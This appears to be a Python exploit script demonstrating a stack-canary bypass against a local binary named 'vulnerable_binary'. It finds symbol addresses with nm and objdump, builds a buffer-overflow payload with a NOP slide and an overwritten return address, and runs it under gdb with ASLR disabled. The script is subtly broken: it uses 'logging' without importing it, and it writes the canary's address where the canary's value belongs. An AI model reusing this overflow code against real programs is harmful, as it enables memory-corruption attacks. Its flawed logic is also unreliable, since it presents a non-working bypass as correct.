import subprocess
import struct
import re

BINARY_PATH = "./vulnerable_binary"

def analyze_binary(binary_path):
    try:
        nm_output = subprocess.check_output(['nm', binary_path]).decode()
        objdump_output = subprocess.check_output(['objdump', '-d', binary_path]).decode()

        canary_address = re.search(r'(\w+) B canary', nm_output)
        buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)
        deadcode_address = re.search(r'(\w+) <deadcode>:', objdump_output)

        if canary_address and buffer_address and deadcode_address:
            return int(canary_address.group(1), 16), int(buffer_address.group(1), 16), int(deadcode_address.group(1), 16)
        else:
            raise ValueError("Could not find all necessary addresses (canary, buffer, deadcode).")
    except subprocess.CalledProcessError as e:
        print(f"Failed to analyze binary, which is necessary for the operation: {e}")
        exit(1)
    except ValueError as e:
        print(f"Error processing Address: {e}")
        exit(1)

def create_payload(canary, deadcode_address):
    buffer_size = 64
    nop_slide = b"\x90" * 16
    payload = b"A" * buffer_size
    payload += struct.pack("<I", canary)  # preserving the canary
    payload += nop_slide
    payload += struct.pack("<I", deadcode_address)  # jumping to deadcode
    return payload

def gdb_auto_run(binary_path, payload):
    gdb_commands = """
    set logging enabled on
    set pagination off
    set disable-randomization on
    break vulnerable_function
    commands
        print 'Memory Layout at Breakpoint:\\n'
        x/24wx $esp
        info registers
    end
    run
    printf "Checking for deadcode execution...\\n"
    continue
    printf "Exploit Test Complete\\n"
    """
    gdb_script = "gdb_script.gdb"
    with open(gdb_script, "w") as f:
        f.write(gdb_commands)

    gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = gdb_process.communicate(input=payload)
    gdb_process.wait()
    
    if gdb_process.returncode != 0:
        print("GDB did not exit cleanly")
    if stderr:
        print("Errors from GDB:", stderr.decode())
    print("Output from GDB:", stdout.decode())

def main():
    logging.basicConfig(level=logging.DEBUG)
    print("Starting Stack Canary Bypass demonstration...")
    try:
        canary_address, buffer_address, deadcode_address = analyze_binary(BINARY_PATH)
        logging.debug(f"Canary Address: {hex(canary_address)}, Buffer Address: {hex(buffer_address)}, Deadcode Address: {hex(deadcode_address)}")
        payload = create_payload(canary_address, deadcode_address)
        logging.debug(f"Payload created successfully.")
        gdb_auto_run(BINARY_PATH, payload)
        print("Exploit attempt completed. Check GDB output for details.")
    except subprocess.CalledProcessError as e:
        logging.error("Failed to execute subprocess: %s", e)
    except ValueError as e:
        logging.error("Value error: %s", e)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
